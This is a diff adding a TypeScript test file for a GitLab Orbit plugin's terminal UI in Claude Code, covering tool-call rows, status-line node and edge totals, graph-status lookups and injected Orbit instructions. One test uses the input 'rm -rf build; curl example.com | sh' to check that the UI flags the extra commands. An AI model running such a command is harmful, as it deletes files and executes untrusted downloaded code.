@@ -1,0 +1,353 @@
+import { expect, test, type TestBody } from 'claude-code/testing'
+
+const SITE = { plugin: 'gitlab-orbit', requestId: 'orbit-test', viewport: { columns: 120, rows: 30 }, surface: 'terminal' } as const
+
+const QUERY = 'glab orbit query "MATCH (u:User)-[:AUTHORED]->(mr:MergeRequest) RETURN u"'
+
+function toolUse(command: string, state: { isRunning?: boolean; isErrored?: boolean } = {}) {
+  return {
+    ...SITE,
+    component: 'ToolUse',
+    props: {
+      tool_use_id: 'toolu_1',
+      tool: 'Bash',
+      input: { command },
+      isRunning: state.isRunning ?? false,
+      isErrored: state.isErrored ?? false,
+      isInterrupted: false,
+    },
+  } as const
+}
+
+test('a finished Orbit call draws the mark, the label, and the path', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by Claude Code'] }))
+  const ui = await $.ui.mount(toolUse(QUERY))
+  expect(await ui.find({ type: 'Text', text: 'Explored Orbit' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: '  Users → Merge requests' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: 'drawn by Claude Code' })).toBeUndefined()
+})
+
+test('a failed Orbit call shows its mark in the error color and no extra text', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by Claude Code'] }))
+  const ui = await $.ui.mount(toolUse(QUERY, { isErrored: true }))
+  expect((await ui.find({ type: 'Text', text: '◎' }))?.props.color).toBe('error')
+  expect(await ui.find({ type: 'Text', text: /failed/ })).toBeUndefined()
+})
+
+test('other tool calls keep Claude Code row', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by Claude Code'] }))
+  const ui = await $.ui.mount(toolUse('ls -la'))
+  expect(await ui.find({ type: 'Text', text: 'drawn by Claude Code' })).toBeDefined()
+})
+
+test('the status line counts finished Orbit calls and passes every call through', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['hint'] }))
+  on('tool.call', () => ({ result: { stdout: 'nodes:\n  User[3]{id}:\n    1\nedges[2]:\n' } }))
+  const answer = await $.tool.call({ tool: 'Bash', command: QUERY })
+  expect(answer).toMatchObject({ result: { stdout: expect.stringContaining('User[3]') } })
+  await $.tool.call({ tool: 'Bash', command: 'ls' })
+
+  const ui = await $.ui.mount({ ...SITE, component: 'PromptHint', props: { isDraft: false, isWorking: false, hint: '' } })
+  expect(await ui.find({ type: 'Text', text: '1' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: /^ call$/ })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: ' nodes' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: ' edges' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: '  ◎ GitLab Orbit' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: '~1' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: ' API call replaced' })).toBeDefined()
+})
+
+test('the status line counts every Orbit call, not only queries', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['hint'] }))
+  on('tool.call', () => ({ result: { stdout: 'ok\n' } }))
+  await $.tool.call({ tool: 'Bash', command: 'glab orbit status' })
+  await $.tool.call({ tool: 'Bash', command: 'glab orbit schema' })
+
+  const ui = await $.ui.mount({ ...SITE, component: 'PromptHint', props: { isDraft: false, isWorking: false, hint: '' } })
+  expect(await ui.find({ type: 'Text', text: '2' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: /^ calls$/ })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: /quer/ })).toBeUndefined()
+})
+
+function graphOf(total: number) {
+  const graph = { itemCounts: { domains: [{ entities: [{ name: 'Job', count: String(total - 1) }, { name: 'Project', count: '1' }] }] } }
+  return { exitCode: 0, stdout: JSON.stringify(graph), stderr: '', isStdoutTruncated: false, isStderrTruncated: false }
+}
+
+async function statusLine($: Parameters<TestBody>[0]) {
+  return $.ui.mount({ ...SITE, component: 'PromptHint', props: { isDraft: false, isWorking: false, hint: '' } })
+}
+
+test('the node total is the graph of the project the query asks about', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['hint'] }))
+  on('tool.call', () => ({ result: { stdout: 'nodes:\n  User[3]{id}:\n    1\n' } }))
+  const runs: (readonly string[])[] = []
+  on('process.run', (_$, e) => {
+    if (e.argv.includes('graph-status')) runs.push(e.argv)
+    return { value: graphOf(1675400) }
+  })
+  await $.tool.call({ tool: 'Bash', command: 'glab orbit query "MATCH (mr:MergeRequest {project_id: 7}) RETURN mr"' })
+  for (let i = 0; i < 10; i++) await Promise.resolve()
+
+  expect(runs).toEqual([['glab', 'orbit', 'graph-status', '--project-id', '7', '--response-format', 'raw']])
+  const ui = await statusLine($)
+  expect(await ui.find({ type: 'Text', text: '3 / 1,675,400' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: ' nodes' })).toBeDefined()
+})
+
+test('queries over several projects add their graphs, each looked up once', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['hint'] }))
+  on('tool.call', () => ({ result: { stdout: 'nodes:\n  User[3]{id}:\n    1\n' } }))
+  const runs: (readonly string[])[] = []
+  on('process.run', (_$, e) => {
+    if (e.argv.includes('graph-status')) runs.push(e.argv)
+    return { value: graphOf(e.argv.includes('a/b') ? 1000 : 500) }
+  })
+  await $.tool.call({ tool: 'Bash', command: "glab orbit query \"MATCH (p:Project {full_path: 'a/b'}) RETURN p\"" })
+  await $.tool.call({ tool: 'Bash', command: 'glab orbit query "MATCH (mr:MergeRequest) WHERE mr.project_id IN [9] RETURN mr"' })
+  await $.tool.call({ tool: 'Bash', command: "glab orbit query \"MATCH (p:Project {full_path: 'a/b'}) RETURN p.id\"" })
+  for (let i = 0; i < 10; i++) await Promise.resolve()
+
+  expect(runs.length).toBe(2)
+  expect(await (await statusLine($)).find({ type: 'Text', text: '9 / 1,500' })).toBeDefined()
+})
+
+test('a query that names no project shows the nodes without a total', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['hint'] }))
+  on('tool.call', () => ({ result: { stdout: 'nodes:\n  User[3]{id}:\n    1\n' } }))
+  on('process.run', () => ({ value: graphOf(1675400) }))
+  await $.tool.call({ tool: 'Bash', command: QUERY })
+  for (let i = 0; i < 10; i++) await Promise.resolve()
+
+  const ui = await statusLine($)
+  expect(await ui.find({ type: 'Text', text: '3' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: '3 / 1,675,400' })).toBeUndefined()
+})
+
+test('a cypher block in a reply draws highlighted, and the prose before it stays Claude Code', async ($, on) => {
+  on('ui.render', (_$, e) => ({ type: 'Text', props: {}, children: ['drawn by Claude Code: ' + (e.props as { text: string }).text] }))
+  const text = 'Here is the query.\n\n```cypher\n-- count by state\nMATCH (mr:MergeRequest {project_id: 1})\nRETURN mr.state, count(mr) AS n\n```'
+  const ui = await $.ui.mount({ ...SITE, component: 'AssistantMessage', props: { text, isFirstOfReply: true } })
+  expect(await ui.find({ type: 'Text', text: 'drawn by Claude Code: Here is the query.' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: 'MATCH' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: 'MergeRequest' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: '-- count by state' })).toBeDefined()
+})
+
+test('a reply without cypher stays Claude Code', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by Claude Code'] }))
+  const ui = await $.ui.mount({ ...SITE, component: 'AssistantMessage', props: { text: '```bash\nls\n```', isFirstOfReply: true } })
+  expect(await ui.find({ type: 'Text', text: 'drawn by Claude Code' })).toBeDefined()
+})
+
+test('a count query adds the edges its counted rows walked', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['hint'] }))
+  const aggregation = 'query_type: aggregation\ncolumns[1]{name,function,target}:\n  n,count,mr\nrows[1]{n}:\n  40\npagination:\n  has_more: false\n'
+  on('tool.call', () => ({ result: { stdout: aggregation } }))
+  await $.tool.call({ tool: 'Bash', command: 'glab orbit query "MATCH (u:User)-[:AUTHORED]->(mr:MergeRequest)-[:IN_PROJECT]->(p:Project {id: 1}) RETURN count(mr) AS n"' })
+
+  const ui = await $.ui.mount({ ...SITE, component: 'PromptHint', props: { isDraft: false, isWorking: false, hint: '' } })
+  expect(await ui.find({ type: 'Text', text: '80' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: ' edges' })).toBeDefined()
+})
+
+const RAN = { exitCode: 1, stdout: '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false }
+
+async function graphStatusRuns(
+  $: Parameters<TestBody>[0],
+  on: Parameters<TestBody>[1],
+  command: string,
+  answer: { result: { stdout: string } } | { deny: string },
+) {
+  const runs: (readonly string[])[] = []
+  on('tool.call', () => answer)
+  on('process.run', (_$, e) => {
+    if (e.argv.includes('graph-status')) runs.push(e.argv)
+    return { value: RAN }
+  })
+  await $.tool.call({ tool: 'Bash', command })
+  for (let i = 0; i < 10; i++) await Promise.resolve()
+  return runs
+}
+
+test('a query scoped to a group asks graph-status for the group by namespace id or full path', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['hint'] }))
+  on('tool.call', () => ({ result: { stdout: 'nodes:\n  Project[1]{id}:\n    1\n' } }))
+  const runs: (readonly string[])[] = []
+  on('process.run', (_$, e) => {
+    if (e.argv.includes('graph-status')) runs.push(e.argv)
+    return { value: graphOf(500) }
+  })
+  await $.tool.call({ tool: 'Bash', command: 'glab orbit query "MATCH (g:Group) WHERE g.id = 9 RETURN g"' })
+  await $.tool.call({ tool: 'Bash', command: `glab orbit query "MATCH (g:Group {full_path: 'a/b'}) RETURN g"` })
+  for (let i = 0; i < 200; i++) await Promise.resolve()
+
+  expect(runs).toEqual([
+    ['glab', 'orbit', 'graph-status', '--namespace-id', '9', '--response-format', 'raw'],
+    ['glab', 'orbit', 'graph-status', '--full-path', 'a/b', '--response-format', 'raw'],
+  ])
+})
+
+const IDENTITIES: Record<string, object> = {
+  'groups/9': { id: 9, full_path: 'a' },
+  'groups/a': { id: 9, full_path: 'a' },
+  'groups/b': { id: 10, full_path: 'b' },
+  'groups/a%2Fsub': { id: 11, full_path: 'a/sub' },
+  'projects/7': { id: 7, path_with_namespace: 'a/p' },
+  'projects/8': { id: 8, path_with_namespace: 'z/p' },
+}
+
+type Lookups = { fail?: boolean; hang?: boolean; runs?: string[] }
+
+async function totalAfter($: Parameters<TestBody>[0], on: Parameters<TestBody>[1], cyphers: string[], lookups: Lookups = {}) {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['hint'] }))
+  on('tool.call', () => ({ result: { stdout: 'nodes:\n  Project[1]{id}:\n    1\n' } }))
+  on('process.run', async (_$, e) => {
+    if (e.argv[1] === 'api') {
+      lookups.runs?.push(e.argv[2] ?? '')
+      if (lookups.hang) await new Promise<never>(() => {})
+      const body = lookups.fail ? undefined : IDENTITIES[e.argv[2] ?? '']
+      const result = { exitCode: body ? 0 : 1, stdout: JSON.stringify(body ?? {}), stderr: '', isStdoutTruncated: false, isStderrTruncated: false }
+      return { value: result }
+    }
+    return { value: graphOf(e.argv.includes('--project-id') ? 5 : 100) }
+  })
+  for (const cypher of cyphers) await $.tool.call({ tool: 'Bash', command: `glab orbit query "${cypher}"` })
+  for (let i = 0; i < 200; i++) await Promise.resolve()
+  const ui = await statusLine($)
+  return async (text: string) => (await ui.find({ type: 'Text', text })) !== undefined
+}
+
+const GROUP_BY_PATH = "MATCH (g:Group {full_path: 'a'}) RETURN g"
+const GROUP_BY_ID = 'MATCH (g:Group) WHERE g.id = 9 RETURN g'
+
+test('the same group asked by path and by id counts once in the total', async ($, on) => {
+  expect(await (await totalAfter($, on, [GROUP_BY_PATH, GROUP_BY_ID]))('2 / 100')).toBe(true)
+})
+
+test('different groups add up in the total', async ($, on) => {
+  expect(await (await totalAfter($, on, [GROUP_BY_PATH, "MATCH (g:Group {full_path: 'b'}) RETURN g"]))('2 / 200')).toBe(true)
+})
+
+test('a project inside a counted group is not added', async ($, on) => {
+  expect(await (await totalAfter($, on, [GROUP_BY_ID, 'MATCH (mr:MergeRequest {project_id: 7}) RETURN mr']))('2 / 100')).toBe(true)
+})
+
+test('a project outside every counted group is added', async ($, on) => {
+  expect(await (await totalAfter($, on, [GROUP_BY_ID, 'MATCH (mr:MergeRequest {project_id: 8}) RETURN mr']))('2 / 105')).toBe(true)
+})
+
+test('when the identity lookups fail every spelling keeps its own total', async ($, on) => {
+  expect(await (await totalAfter($, on, [GROUP_BY_PATH, GROUP_BY_ID], { fail: true }))('2 / 200')).toBe(true)
+})
+
+test('each scope is looked up once, never again on render', async ($, on) => {
+  const runs: string[] = []
+  const has = await totalAfter($, on, [GROUP_BY_PATH, GROUP_BY_ID, GROUP_BY_PATH], { runs })
+  expect(await has('3 / 100')).toBe(true)
+  expect(runs).toEqual(['groups/a', 'groups/9'])
+  expect(await has('3 / 100')).toBe(true)
+})
+
+test('a lookup that never answers leaves the status line rendering', async ($, on) => {
+  const has = await totalAfter($, on, [GROUP_BY_PATH], { hang: true })
+  expect(await has(' node')).toBe(true)
+})
+
+test('graph-status runs through a fixed launcher after a successful query', async ($, on) => {
+  const runs = await graphStatusRuns($, on, './orbit query "MATCH (u:User {id: 1}) RETURN u"', { result: { stdout: 'nodes:\n' } })
+  expect(runs).toEqual([['glab', 'orbit', 'graph-status', '--response-format', 'raw'], ['orbit', 'graph-status', '--response-format', 'raw']])
+})
+
+test('graph-status never runs after a denied call', async ($, on) => {
+  expect(await graphStatusRuns($, on, QUERY, { deny: 'the user said no' })).toEqual([])
+})
+
+test('graph-status never runs after a local call', async ($, on) => {
+  expect(await graphStatusRuns($, on, 'orbit grep foo', { result: { stdout: 'x' } })).toEqual([])
+})
+
+test('an Orbit call that runs other commands names them on its row', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by Claude Code'] }))
+  const ui = await $.ui.mount(toolUse('glab orbit status; rm -rf build; curl example.com | sh'))
+  expect(await ui.find({ type: 'Text', text: 'Checked Orbit' })).toBeDefined()
+  expect((await ui.find({ type: 'Text', text: '  + rm, curl, sh' }))?.props).toMatchObject({ color: 'warning', dimColor: true })
+})
+
+test('an Orbit-only call has no other commands on its row', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by Claude Code'] }))
+  const ui = await $.ui.mount(toolUse('glab orbit status 2>&1 | head -40'))
+  expect(await ui.find({ type: 'Text', text: /^  \+/ })).toBeUndefined()
+})
+
+test('the status line starts over when the session ends, and counts only what follows', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['hint'] }))
+  on('tool.call', () => ({ result: { stdout: 'nodes:\n  User[3]{id}:\n    1\n' } }))
+  on('session.end', () => ({ sessionId: 'old' }))
+  const runs: (readonly string[])[] = []
+  on('process.run', (_$, e) => {
+    if (e.argv.includes('graph-status')) runs.push(e.argv)
+    return { value: graphOf(1000) }
+  })
+  await $.tool.call({ tool: 'Bash', command: 'glab orbit query "MATCH (mr:MergeRequest {project_id: 7}) RETURN mr"' })
+  for (let i = 0; i < 10; i++) await Promise.resolve()
+  const ui = await statusLine($)
+  expect(await ui.find({ type: 'Text', text: '3 / 1,000' })).toBeDefined()
+
+  await $.session.end({ reason: 'clear', sessionId: 'old', resume: { id: 'old' } } as never)
+  expect(await ui.find({ type: 'Text', text: /call/ })).toBeUndefined()
+
+  await $.tool.call({ tool: 'Bash', command: QUERY })
+  for (let i = 0; i < 10; i++) await Promise.resolve()
+  expect(await ui.find({ type: 'Text', text: '3' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: /^ call$/ })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: /\//})).toBeUndefined()
+  expect(runs.length).toBe(2)
+})
+
+const RAN_WITH = (exitCode: number, stdout: string) => ({
+  value: { exitCode, stdout, stderr: '', isStdoutTruncated: false, isStderrTruncated: false },
+})
+
+test('the conversation context carries the Orbit instructions the installed CLI prints', async ($, on) => {
+  const runs: (readonly string[])[] = []
+  on('process.run', (_$, e) => {
+    runs.push(e.argv)
+    return RAN_WITH(0, e.argv[0] === 'glab' ? '## Orbit\n\n- MANDATORY: `glab orbit grep`\n' : '')
+  })
+  on('prompt.context', (_$, e) => ({ blocks: e.blocks }))
+  const answer = await $.prompt.context({ blocks: [{ name: 'claudeMd', text: 'mine' }] })
+
+  expect(runs).toEqual([
+    ['glab', 'orbit', 'hook-guard', 'instructions'],
+    ['orbit', 'hook-guard', 'instructions'],
+  ])
+  expect(answer.blocks).toEqual([
+    { name: 'claudeMd', text: 'mine' },
+    { name: 'orbit', text: '## Orbit\n\n- MANDATORY: `glab orbit grep`' },
+  ])
+})
+
+test('the context falls back to orbit when glab orbit prints nothing', async ($, on) => {
+  const runs: (readonly string[])[] = []
+  on('process.run', (_$, e) => {
+    runs.push(e.argv)
+    return RAN_WITH(0, e.argv[0] === 'glab' ? '' : '## Orbit\n')
+  })
+  on('prompt.context', (_$, e) => ({ blocks: e.blocks }))
+  const answer = await $.prompt.context({ blocks: [] })
+
+  expect(runs).toEqual([
+    ['glab', 'orbit', 'hook-guard', 'instructions'],
+    ['orbit', 'hook-guard', 'instructions'],
+  ])
+  expect(answer.blocks).toEqual([{ name: 'orbit', text: '## Orbit' }])
+})
+
+test('the context adds nothing when the CLI fails', async ($, on) => {
+  on('process.run', () => ({ value: { exitCode: 1, stdout: 'partial', stderr: 'x', isStdoutTruncated: false, isStderrTruncated: false } }))
+  on('prompt.context', (_$, e) => ({ blocks: e.blocks }))
+  const answer = await $.prompt.context({ blocks: [{ name: 'claudeMd', text: 'mine' }] })
+
+  expect(answer.blocks).toEqual([{ name: 'claudeMd', text: 'mine' }])
+})
